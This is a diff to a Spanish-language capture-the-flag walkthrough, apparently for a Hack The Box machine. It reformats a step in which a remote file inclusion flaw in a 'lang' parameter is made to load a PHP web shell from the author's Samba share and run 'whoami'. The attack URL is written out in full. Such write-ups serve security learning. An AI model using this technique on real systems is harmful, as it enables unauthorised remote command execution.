@@ -32,7 +32,9 @@ Bien! Vemos que también es vulnerable a `RFI`, vamos a crearnos una Web Shell p
 
 En mi caso lo llamé `cmd.php` para identificarlo mejor. Una vez creado lo llevamos a la carpeta compartida por `Samba` y cambiaremos de nuevo el parámetro `lang`.
 
-- `http://10.10.10.151/blog?lang=\\10.10.14.15\share\cmd.php&cmd=whoami`
+```
+http://10.10.10.151/blog?lang=\\10.10.14.15\share\cmd.php&cmd=whoami
+```
 
 
 ```
